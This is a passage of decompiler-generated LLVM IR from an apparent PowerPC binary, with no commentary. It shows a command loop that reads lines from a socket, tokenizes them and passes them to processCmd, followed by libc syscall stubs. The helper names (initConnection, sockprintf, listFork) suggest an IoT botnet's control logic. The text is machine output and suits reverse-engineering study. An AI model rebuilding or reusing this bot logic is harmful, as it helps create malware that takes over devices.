  br i1 %v3_1000bd78, label %dec_label_pc_1000bd80, label %dec_label_pc_1000bd10

dec_label_pc_1000bd80:                            ; preds = %dec_label_pc_1000bd60
  %v1_1000bd84 = call i32 @fdpclose(i32 %v3_1000bd00)
  %v0_1000bd8c = call i32 @__GI_exit()
  br label %dec_label_pc_1000bd90

dec_label_pc_1000bd90:                            ; preds = %dec_label_pc_1000bc84, %dec_label_pc_1000bd80
  store i32 ptrtoint (i32* @global_var_10016544.578 to i32), i32* @r4, align 4
  store i32 268484012, i32* @lr, align 4
  %v3_1000bda8 = call i32 @__GI_strtok(i32 %v1_1000bc28, i32 ptrtoint (i32* @global_var_10016544.578 to i32), i32 268500992)
  store i32 %v1_1000bb44, i32* %stack_var_-5472, align 4
  %v3_1000bea050 = icmp eq i32 %v3_1000bda8, 0
  br i1 %v3_1000bea050, label %dec_label_pc_1000bea8, label %dec_label_pc_1000bdc0

dec_label_pc_1000bdc0:                            ; preds = %dec_label_pc_1000bd90, %dec_label_pc_1000be84
  %stack_var_-5808.053.in = phi i32 [ %v3_1000be90, %dec_label_pc_1000be84 ], [ %v3_1000bda8, %dec_label_pc_1000bd90 ]
  %stack_var_-5804.151 = phi i32 [ %stack_var_-5804.0, %dec_label_pc_1000be84 ], [ 1, %dec_label_pc_1000bd90 ]
  %stack_var_-5808.053 = inttoptr i32 %stack_var_-5808.053.in to i8*
  %v2_1000bdc4 = load i8, i8* %stack_var_-5808.053, align 1
  %v3_1000bdcc = icmp eq i8 %v2_1000bdc4, 10
  br i1 %v3_1000bdcc, label %dec_label_pc_1000be84, label %dec_label_pc_1000bdd4

dec_label_pc_1000bdd4:                            ; preds = %dec_label_pc_1000bdc0
  store i32 %stack_var_-5804.151, i32* @r29, align 4
  store i32 %stack_var_-5808.053.in, i32* @r3, align 4
  %v0_1000bde0 = call i32 @__GI_strlen()
  %v1_1000bde8 = add i32 %v0_1000bde0, 1
  store i32 %v1_1000bde8, i32* @r3, align 4
  store i32 268484084, i32* @lr, align 4
  %v0_1000bdf0 = call i32 @malloc()
  %v0_1000bdfc = load i32, i32* @r29, align 4
  %v1_1000bdfc = mul i32 %v0_1000bdfc, 4
  %v1_1000be08 = add i32 %v1_1000bdfc, %v2_1000bee4
  %v2_1000be0c = inttoptr i32 %v1_1000be08 to i32*
  store i32 %v0_1000bdf0, i32* %v2_1000be0c, align 4
  %v1_1000be14 = mul i32 %stack_var_-5804.151, 4
  %v1_1000be20 = add i32 %v1_1000be14, %v2_1000bee4
  %v1_1000be24 = inttoptr i32 %v1_1000be20 to i32*
  %v2_1000be24 = load i32, i32* %v1_1000be24, align 4
  store i32 %stack_var_-5808.053.in, i32* @r3, align 4
  %v0_1000be30 = call i32 @__GI_strlen()
  %v1_1000be38 = add i32 %v0_1000be30, 1
  store i32 268484176, i32* @lr, align 4
  %v3_1000be4c = call i32 @__GI_memset(i32 %v2_1000be24, i32 0, i32 %v1_1000be38)
  %v2_1000be64 = load i32, i32* %v1_1000be24, align 4
  %v4_1000be74 = call i32 @strcpy(i32 %v2_1000be64, i8* nonnull %stack_var_-5808.053)
  %v1_1000be7c = add i32 %stack_var_-5804.151, 1
  br label %dec_label_pc_1000be84

dec_label_pc_1000be84:                            ; preds = %dec_label_pc_1000bdc0, %dec_label_pc_1000bdd4
  %stack_var_-5804.0 = phi i32 [ %stack_var_-5804.151, %dec_label_pc_1000bdc0 ], [ %v1_1000be7c, %dec_label_pc_1000bdd4 ]
  store i32 ptrtoint (i32* @global_var_10016544.578 to i32), i32* @r4, align 4
  store i32 268484244, i32* @lr, align 4
  %v3_1000be90 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10016544.578 to i32), i32 268500992)
  %v3_1000bea0 = icmp eq i32 %v3_1000be90, 0
  br i1 %v3_1000bea0, label %dec_label_pc_1000bea8, label %dec_label_pc_1000bdc0

dec_label_pc_1000bea8:                            ; preds = %dec_label_pc_1000be84, %dec_label_pc_1000bd90
  %stack_var_-5804.1.lcssa = phi i32 [ 1, %dec_label_pc_1000bd90 ], [ %stack_var_-5804.0, %dec_label_pc_1000be84 ]
  store i32 268484280, i32* @lr, align 4
  %v3_1000beb4 = call i32 @processCmd(i32 %stack_var_-5804.1.lcssa, i32* nonnull %stack_var_-5472)
  %tmp112 = icmp slt i32 %stack_var_-5804.1.lcssa, 2
  br i1 %tmp112, label %dec_label_pc_1000bf14.outer, label %dec_label_pc_1000bed8.lr.ph

dec_label_pc_1000bed8.lr.ph:                      ; preds = %dec_label_pc_1000bea8
  store i32 1, i32* %stack_var_-5816, align 4
  br label %dec_label_pc_1000bed8

dec_label_pc_1000bed8:                            ; preds = %dec_label_pc_1000bed8.lr.ph, %dec_label_pc_1000bed8
  %v3_1000bed8 = phi i32 [ 1, %dec_label_pc_1000bed8.lr.ph ], [ %v1_1000befc, %dec_label_pc_1000bed8 ]
  %v1_1000bedc = mul i32 %v3_1000bed8, 4
  %v1_1000bee8 = add i32 %v2_1000bee4, %v1_1000bedc
  %v1_1000beec = inttoptr i32 %v1_1000bee8 to i32*
  %v2_1000beec = load i32, i32* %v1_1000beec, align 4
  store i32 %v2_1000beec, i32* @r3, align 4
  store i32 268484344, i32* @lr, align 4
  %v0_1000bef4 = call i32 @free()
  %v3_1000bef8 = load i32, i32* %stack_var_-5816, align 4
  %v1_1000befc = add i32 %v3_1000bef8, 1
  store i32 %v1_1000befc, i32* %stack_var_-5816, align 4
  %v2_1000bf0c = icmp slt i32 %v1_1000befc, %stack_var_-5804.1.lcssa
  br i1 %v2_1000bf0c, label %dec_label_pc_1000bed8, label %dec_label_pc_1000bf14.outer

dec_label_pc_1000bf14.outer:                      ; preds = %dec_label_pc_1000bed8, %dec_label_pc_1000ba9c, %dec_label_pc_1000bca4, %dec_label_pc_1000bea8, %dec_label_pc_1000bafc, %dec_label_pc_1000b6b4
  %stack_var_-5748.2.ph = phi i32 [ %stack_var_-5748.0.ph21, %dec_label_pc_1000b6b4 ], [ %stack_var_-5748.1, %dec_label_pc_1000bafc ], [ %stack_var_-5748.1, %dec_label_pc_1000bea8 ], [ %stack_var_-5748.1, %dec_label_pc_1000bca4 ], [ %stack_var_-5748.1, %dec_label_pc_1000ba9c ], [ %stack_var_-5748.1, %dec_label_pc_1000bed8 ]
  br label %dec_label_pc_1000bf14

dec_label_pc_1000bf14:                            ; preds = %dec_label_pc_1000bf14.outer, %dec_label_pc_1000ba24
  %v3_1000bf18 = load i32, i32* @global_var_100285b0.29, align 4
  %v5_1000bf2c = call i32 @recvLine(i32 %v3_1000bf18, i8* %v4_1000bf2c, i32 4096, i32 %v2_1000bf1c)
  %v4_1000bf40 = icmp eq i32 %v5_1000bf2c, -1
  br i1 %v4_1000bf40, label %dec_label_pc_1000b698.outer, label %dec_label_pc_1000b974

; uselistorder directives
  uselistorder i32 %v5_1000bf2c, { 1, 0 }
  uselistorder i32 %v1_1000befc, { 1, 2, 0 }
  uselistorder i32 %stack_var_-5804.1.lcssa, { 2, 1, 0 }
  uselistorder i32 %v3_1000be90, { 1, 0 }
  uselistorder i8* %stack_var_-5808.053, { 1, 0 }
  uselistorder i32 %stack_var_-5804.151, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_1000bc68, { 1, 0 }
  uselistorder i32 %storemerge1445, { 1, 0 }
  uselistorder i8* %storemerge746, { 1, 0 }
  uselistorder i32 %v1_1000bc28, { 1, 0 }
  uselistorder i8* %stack_var_-5780.029, { 3, 0, 4, 2, 1, 5 }
  uselistorder i32 %v1_1000bb44, { 5, 0, 2, 1, 3, 6, 7, 4 }
  uselistorder i32 %v1_1000babc, { 1, 0 }
  uselistorder i32 %v1_1000ba6c, { 1, 2, 0 }
  uselistorder i32 %v2_1000b9a0, { 1, 0 }
  uselistorder i32 %storemerge12, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32 %storemerge17, { 1, 0, 2 }
  uselistorder i32 %v1_1000b8a8, { 1, 0 }
  uselistorder i32 %v0_1000b88c, { 1, 0 }
  uselistorder i32 %v3_1000b840, { 1, 0 }
  uselistorder i32 %v1_1000b758, { 1, 3, 0, 2 }
  uselistorder i32 %v2_1000bee4, { 2, 1, 0 }
  uselistorder i32 %v2_1000bcb4, { 4, 2, 1, 3, 5, 0, 6 }
  uselistorder i8* %v4_1000bf2c, { 1, 0 }
  uselistorder i32 %v2_1000bf1c, { 5, 1, 0, 3, 4, 6, 7, 8, 2 }
  uselistorder i32 %v3_1000b594, { 1, 0, 2 }
  uselistorder i32 %v2_1000b520, { 1, 0, 2 }
  uselistorder i32 %v2_1000b4f8, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_1000b4c0, { 0, 2, 1 }
  uselistorder i32 %stack_var_-5756.0, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_1000b360, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %stack_var_-5816, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32, i32)* @__GI_strtok, { 1, 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10016544.578 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 2, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @szprintf, { 112, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25 }
  uselistorder i32 ()* @listFork, { 0, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32)* @strstr, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* @global_var_100285b8.46, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32 (i32, i32, i32)* @sockprintf, { 2, 1, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0 }
  uselistorder i32 (i32)* @sleep, { 0, 2, 1 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @zprintf, { 0, 2, 1 }
  uselistorder i32 ()* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder i8 47, { 1, 0 }
  uselistorder [2 x i8]* @global_var_100164d4.551, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_100164d4.551 to i32), { 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_time, { 15, 14, 13, 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_100164bc.546 to i32), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000bf14.outer, { 0, 3, 2, 4, 1, 5 }
  uselistorder label %dec_label_pc_1000bed8, { 1, 0 }
  uselistorder label %dec_label_pc_1000be84, { 1, 0 }
  uselistorder label %dec_label_pc_1000bdc0, { 1, 0 }
  uselistorder label %dec_label_pc_1000bd90, { 1, 0 }
  uselistorder label %dec_label_pc_1000bd60, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc3c, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc18, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000bc04, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb78, { 1, 0 }
  uselistorder label %dec_label_pc_1000bad4, { 1, 0 }
  uselistorder label %dec_label_pc_1000ba9c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b9e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b968, { 1, 0 }
  uselistorder label %dec_label_pc_1000b8e4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b8a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b7ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000b764, { 1, 0 }
  uselistorder label %dec_label_pc_1000b6a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000b698.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b678, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b5dc, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000b4bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000b45c, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_1000bf5c = icmp eq i32 %arg2, -2143521772
  %v2_1000bf70 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000bf70, i32* %stack_var_-32, align 4
  br i1 %v4_1000bf5c, label %dec_label_pc_1000bfd0, label %dec_label_pc_1000bf90

dec_label_pc_1000bf90:                            ; preds = %entry
  %v3_1000bf90 = icmp ugt i32 %arg2, -2143521772
  br i1 %v3_1000bf90, label %dec_label_pc_1000bfa8, label %dec_label_pc_1000bf98

dec_label_pc_1000bf98:                            ; preds = %dec_label_pc_1000bf90
  %v3_1000bf9c = icmp eq i32 %arg2, 1077703699
  br i1 %v3_1000bf9c, label %dec_label_pc_1000bfc4, label %dec_label_pc_1000bff0

dec_label_pc_1000bfa8:                            ; preds = %dec_label_pc_1000bf90
  %v1_1000bfa8 = xor i32 %arg2, -2143551488
  %v3_1000bfac = icmp eq i32 %v1_1000bfa8, 29717
  br i1 %v3_1000bfac, label %dec_label_pc_1000bfe0, label %dec_label_pc_1000bfb4

dec_label_pc_1000bfb4:                            ; preds = %dec_label_pc_1000bfa8
  %v3_1000bfb8 = icmp eq i32 %v1_1000bfa8, 29718
  br i1 %v3_1000bfb8, label %dec_label_pc_1000bfe8, label %dec_label_pc_1000bff0

dec_label_pc_1000bfc4:                            ; preds = %dec_label_pc_1000bf98
  store i32 ptrtoint (i32* @global_var_1000bfcc.579 to i32), i32* @lr, align 4
  %v1_1000bfc8 = inttoptr i32 %arg3 to i32*
  %v2_1000bfc8 = call i32 @__GI_tcgetattr(i32* %v1_1000bfc8)
  br label %dec_label_pc_1000bfd8

dec_label_pc_1000bfd0:                            ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1000bfd4

dec_label_pc_1000bfd4:                            ; preds = %dec_label_pc_1000bfe8, %dec_label_pc_1000bfe0, %dec_label_pc_1000bfd0
  store i32 268484568, i32* @lr, align 4
  %v0_1000bfd4 = call i32 @__GI_tcsetattr()
  br label %dec_label_pc_1000bfd8

dec_label_pc_1000bfd8:                            ; preds = %dec_label_pc_1000bfc4, %dec_label_pc_1000bfd4
  %storemerge = phi i32 [ %v0_1000bfd4, %dec_label_pc_1000bfd4 ], [ %v2_1000bfc8, %dec_label_pc_1000bfc4 ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c01c

dec_label_pc_1000bfe0:                            ; preds = %dec_label_pc_1000bfa8
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1000bfd4

dec_label_pc_1000bfe8:                            ; preds = %dec_label_pc_1000bfb4
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_1000bfd4

dec_label_pc_1000bff0:                            ; preds = %dec_label_pc_1000bfb4, %dec_label_pc_1000bf98
  %v0_1000c000 = call i32 @__asm_mfcr()
  %v1_1000c004 = and i32 %v0_1000c000, 268435456
  %v3_1000c004 = icmp eq i32 %v1_1000c004, 0
  store i32 %v0_1000c000, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c004, label %dec_label_pc_1000c01c, label %dec_label_pc_1000c010

dec_label_pc_1000c010:                            ; preds = %dec_label_pc_1000bff0
  %v0_1000c010 = call i32 @__errno_location()
  %v0_1000c014 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c014 = inttoptr i32 %v0_1000c010 to i32*
  store i32 %v0_1000c014, i32* %v2_1000c014, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c01c

dec_label_pc_1000c01c:                            ; preds = %dec_label_pc_1000bff0, %dec_label_pc_1000bfd8, %dec_label_pc_1000c010
  %v0_1000c020 = phi i32 [ %v0_1000c000, %dec_label_pc_1000bff0 ], [ %storemerge, %dec_label_pc_1000bfd8 ], [ -1, %dec_label_pc_1000c010 ]
  ret i32 %v0_1000c020

; uselistorder directives
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000c01c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000bfd8, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_1000c03c = load i32, i32* @lr, align 4
  %v1_1000c03c = load i1, i1* @cr0_so, align 1
  %v2_1000c03c = xor i1 %v1_1000c03c, true
  call void @__pseudo_cond_branch(i1 %v2_1000c03c, i32 %v0_1000c03c)
  %v0_1000c040 = call i32 @__syscall_error()
  ret i32 %v0_1000c040
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_1000c058 = add i32 %arg2, -12
  %v2_1000c05c = icmp ugt i32 %v1_1000c058, 2
  %v2_1000c064 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000c064, i32* %stack_var_-32, align 4
  br i1 %v2_1000c05c, label %dec_label_pc_1000c090, label %dec_label_pc_1000c080

dec_label_pc_1000c080:                            ; preds = %entry
  store i32 268484744, i32* @lr, align 4
  %v2_1000c084 = call i32 @__GI_fcntl64(i32 3)
  store i32 %v2_1000c084, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c0b0

dec_label_pc_1000c090:                            ; preds = %entry
  %v0_1000c094 = call i32 @__asm_mfcr()
  %v1_1000c098 = and i32 %v0_1000c094, 268435456
  %v3_1000c098 = icmp eq i32 %v1_1000c098, 0
  store i32 %v0_1000c094, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c098, label %dec_label_pc_1000c0b0, label %dec_label_pc_1000c0a4

dec_label_pc_1000c0a4:                            ; preds = %dec_label_pc_1000c090
  %v0_1000c0a4 = call i32 @__errno_location()
  %v0_1000c0a8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c0a8 = inttoptr i32 %v0_1000c0a4 to i32*
  store i32 %v0_1000c0a8, i32* %v2_1000c0a8, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c0b0

dec_label_pc_1000c0b0:                            ; preds = %dec_label_pc_1000c090, %dec_label_pc_1000c080, %dec_label_pc_1000c0a4
  %v0_1000c0b4 = phi i32 [ %v0_1000c094, %dec_label_pc_1000c090 ], [ %v2_1000c084, %dec_label_pc_1000c080 ], [ -1, %dec_label_pc_1000c0a4 ]
  ret i32 %v0_1000c0b4

; uselistorder directives
  uselistorder label %dec_label_pc_1000c0b0, { 2, 0, 1 }
}

define i32 @__GI_fcntl64(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_1000c0e0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000c0e0, i32* %stack_var_-32, align 4
  %v0_1000c0fc = call i32 @__asm_mfcr()
  %v1_1000c100 = and i32 %v0_1000c0fc, 268435456
  %v3_1000c100 = icmp eq i32 %v1_1000c100, 0
  store i32 %v0_1000c0fc, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c100, label %dec_label_pc_1000c118, label %dec_label_pc_1000c10c

dec_label_pc_1000c10c:                            ; preds = %entry
  %v0_1000c10c = call i32 @__errno_location()
  %v0_1000c110 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c110 = inttoptr i32 %v0_1000c10c to i32*
  store i32 %v0_1000c110, i32* %v2_1000c110, align 4
  br label %dec_label_pc_1000c118

dec_label_pc_1000c118:                            ; preds = %entry, %dec_label_pc_1000c10c
  %v0_1000c128 = phi i32 [ %v0_1000c0fc, %entry ], [ -1, %dec_label_pc_1000c10c ]
  ret i32 %v0_1000c128

; uselistorder directives
  uselistorder label %dec_label_pc_1000c118, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_1000c140

dec_label_pc_1000c140:                            ; preds = %dec_label_pc_1000c140.backedge, %entry
  %v0_1000c14c = call i32 @__asm_mfcr()
  %v1_1000c150 = and i32 %v0_1000c14c, 268435456
  %v3_1000c150 = icmp eq i32 %v1_1000c150, 0
  store i32 %v0_1000c14c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c150, label %dec_label_pc_1000c140.backedge, label %dec_label_pc_1000c15c

dec_label_pc_1000c15c:                            ; preds = %dec_label_pc_1000c140
  %v0_1000c15c = call i32 @__errno_location()
  %v0_1000c160 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c160 = inttoptr i32 %v0_1000c15c to i32*
  store i32 %v0_1000c160, i32* %v2_1000c160, align 4
  br label %dec_label_pc_1000c140.backedge

dec_label_pc_1000c140.backedge:                   ; preds = %dec_label_pc_1000c15c, %dec_label_pc_1000c140
  br label %dec_label_pc_1000c140
}

define i32 @chdir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c180 = call i32 @__asm_mfcr()
  %v1_1000c184 = and i32 %v0_1000c180, 268435456
  %v3_1000c184 = icmp eq i32 %v1_1000c184, 0
  store i32 %v0_1000c180, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c184, label %dec_label_pc_1000c19c, label %dec_label_pc_1000c190

dec_label_pc_1000c190:                            ; preds = %entry
  %v0_1000c190 = call i32 @__errno_location()
  %v0_1000c194 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c194 = inttoptr i32 %v0_1000c190 to i32*
  store i32 %v0_1000c194, i32* %v2_1000c194, align 4
  br label %dec_label_pc_1000c19c

dec_label_pc_1000c19c:                            ; preds = %entry, %dec_label_pc_1000c190
  %v0_1000c1ac = phi i32 [ %v0_1000c180, %entry ], [ -1, %dec_label_pc_1000c190 ]
  ret i32 %v0_1000c1ac

; uselistorder directives
  uselistorder label %dec_label_pc_1000c19c, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c1c8 = call i32 @__asm_mfcr()
  %v1_1000c1cc = and i32 %v0_1000c1c8, 268435456
  %v3_1000c1cc = icmp eq i32 %v1_1000c1cc, 0
  store i32 %v0_1000c1c8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c1cc, label %dec_label_pc_1000c1e4, label %dec_label_pc_1000c1d8

dec_label_pc_1000c1d8:                            ; preds = %entry
  %v0_1000c1d8 = call i32 @__errno_location()
  %v0_1000c1dc = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c1dc = inttoptr i32 %v0_1000c1d8 to i32*
  store i32 %v0_1000c1dc, i32* %v2_1000c1dc, align 4
  br label %dec_label_pc_1000c1e4

dec_label_pc_1000c1e4:                            ; preds = %entry, %dec_label_pc_1000c1d8
  %v0_1000c1f4 = phi i32 [ %v0_1000c1c8, %entry ], [ -1, %dec_label_pc_1000c1d8 ]
  ret i32 %v0_1000c1f4

; uselistorder directives
  uselistorder label %dec_label_pc_1000c1e4, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c210 = call i32 @__asm_mfcr()
  %v1_1000c214 = and i32 %v0_1000c210, 268435456
  %v3_1000c214 = icmp eq i32 %v1_1000c214, 0
  store i32 %v0_1000c210, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c214, label %dec_label_pc_1000c22c, label %dec_label_pc_1000c220

dec_label_pc_1000c220:                            ; preds = %entry
  %v0_1000c220 = call i32 @__errno_location()
  %v0_1000c224 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c224 = inttoptr i32 %v0_1000c220 to i32*
  store i32 %v0_1000c224, i32* %v2_1000c224, align 4
  br label %dec_label_pc_1000c22c

dec_label_pc_1000c22c:                            ; preds = %entry, %dec_label_pc_1000c220
  %v0_1000c23c = phi i32 [ %v0_1000c210, %entry ], [ -1, %dec_label_pc_1000c220 ]
  ret i32 %v0_1000c23c

; uselistorder directives
  uselistorder label %dec_label_pc_1000c22c, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c258 = call i32 @__asm_mfcr()
  %v1_1000c25c = and i32 %v0_1000c258, 268435456
  %v3_1000c25c = icmp eq i32 %v1_1000c25c, 0
  store i32 %v0_1000c258, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c25c, label %dec_label_pc_1000c274, label %dec_label_pc_1000c268

dec_label_pc_1000c268:                            ; preds = %entry
  %v0_1000c268 = call i32 @__errno_location()
  %v0_1000c26c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c26c = inttoptr i32 %v0_1000c268 to i32*
  store i32 %v0_1000c26c, i32* %v2_1000c26c, align 4
  br label %dec_label_pc_1000c274

dec_label_pc_1000c274:                            ; preds = %entry, %dec_label_pc_1000c268
  %v0_1000c284 = phi i32 [ %v0_1000c258, %entry ], [ -1, %dec_label_pc_1000c268 ]
  ret i32 %v0_1000c284

; uselistorder directives
  uselistorder label %dec_label_pc_1000c274, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r28, align 4
  %v3_1000c294 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r30, align 4
  %v3_1000c2a4 = icmp eq i32 %arg1, 0
  br i1 %v3_1000c294, label %dec_label_pc_1000c2a4, label %dec_label_pc_1000c2d8

dec_label_pc_1000c2a4:                            ; preds = %entry
  br i1 %v3_1000c2a4, label %dec_label_pc_1000c2c0, label %dec_label_pc_1000c2ac

dec_label_pc_1000c2ac:                            ; preds = %dec_label_pc_1000c2a4
  %v0_1000c2ac = call i32 @__errno_location()
  store i32 0, i32* @r30, align 4
  %v2_1000c2b8 = inttoptr i32 %v0_1000c2ac to i32*
  store i32 22, i32* %v2_1000c2b8, align 4
  br label %dec_label_pc_1000c370

dec_label_pc_1000c2c0:                            ; preds = %dec_label_pc_1000c2a4
  store i32 268485316, i32* @lr, align 4
  %v0_1000c2c0 = call i32 @__GI_getpagesize()
  %v1_1000c2c4 = icmp slt i32 %v0_1000c2c0, 4096
  %v0_1000c2c8. = select i1 %v1_1000c2c4, i32 4096, i32 %v0_1000c2c0
  store i32 %v0_1000c2c8., i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c2e8

dec_label_pc_1000c2d8:                            ; preds = %entry
  store i32 %arg2, i32* %r31.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  br i1 %v3_1000c2a4, label %dec_label_pc_1000c2e8, label %dec_label_pc_1000c2f8

dec_label_pc_1000c2e8:                            ; preds = %dec_label_pc_1000c2c0, %dec_label_pc_1000c2d8
  %v0_1000c2e8 = phi i32 [ %v0_1000c2c8., %dec_label_pc_1000c2c0 ], [ %arg2, %dec_label_pc_1000c2d8 ]
  store i32 %v0_1000c2e8, i32* @r3, align 4
  store i32 268485360, i32* @lr, align 4
  %v0_1000c2ec = call i32 @malloc()
  store i32 %v0_1000c2ec, i32* @r29, align 4
  %v3_1000c2f0 = icmp eq i32 %v0_1000c2ec, 0
  br i1 %v3_1000c2f0, label %dec_label_pc_1000c36c, label %dec_label_pc_1000c2e8.dec_label_pc_1000c2f8_crit_edge

dec_label_pc_1000c2e8.dec_label_pc_1000c2f8_crit_edge: ; preds = %dec_label_pc_1000c2e8
  br label %dec_label_pc_1000c2f8

dec_label_pc_1000c2f8:                            ; preds = %dec_label_pc_1000c2e8.dec_label_pc_1000c2f8_crit_edge, %dec_label_pc_1000c2d8
  %v0_1000c308 = call i32 @__asm_mfcr()
  %v1_1000c30c = and i32 %v0_1000c308, 268435456
  %v3_1000c30c = icmp eq i32 %v1_1000c30c, 0
  store i32 %v0_1000c308, i32* %r31.global-to-local, align 4
  store i32 %v0_1000c308, i32* @r4, align 4
  br i1 %v3_1000c30c, label %dec_label_pc_1000c328, label %dec_label_pc_1000c31c

